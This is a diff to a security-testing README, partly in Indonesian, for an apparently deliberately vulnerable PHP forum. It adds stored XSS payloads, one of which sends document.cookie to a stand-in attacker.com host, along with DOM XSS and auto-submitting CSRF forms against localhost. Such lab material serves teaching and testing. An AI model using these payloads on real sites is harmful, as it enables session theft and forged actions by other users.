@@ -154,6 +154,18 @@ Musywar/
    post.php?id=1&msg=<img src=x onerror=alert(document.cookie)>
    ```
 
+4. **Stored XSS via Create Post**:
+   ```html
+   <!-- Di form create-post.php -->
+   <script>alert('Stored XSS')</script>
+   <img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
+   ```
+
+5. **XSS di Preview Function**:
+   ```
+   create-post.php?xss=<script>alert('DOM XSS')</script>
+   ```
+
 ### SQL Injection Testing
 
 1. **Authentication Bypass**:
@@ -202,7 +214,23 @@ Buat file HTML malicious untuk menghapus user:
 </html>
 ```
 
-#### 2. **Testing dengan Browser**
+#### 2. **Post Creation CSRF Attack**
+Membuat postingan malicious sebagai user lain:
+```html
+<form action="http://localhost:8000/create-post.php" method="POST">
+    <input type="hidden" name="title" value="🚨 CSRF ATTACK POST">
+    <input type="hidden" name="content" value="<script>alert('CSRF+XSS Attack Success!')</script><p>This post was created via CSRF attack!</p>">
+    <input type="hidden" name="category" value="1">
+    <script>document.forms[0].submit();</script>
+</form>
+```
+
+#### 3. **Auto-Submit CSRF dengan Parameter**:
+```
+http://localhost:8000/create-post.php?test_title=HACKED&test_content=<script>alert('CSRF')</script>&test_category=1&auto_submit=true
+```
+
+#### 4. **Testing dengan Browser**
 Langkah-langkah manual testing:
 1. Login sebagai admin di browser pertama
 2. Buka file CSRF malicious di browser/tab kedua
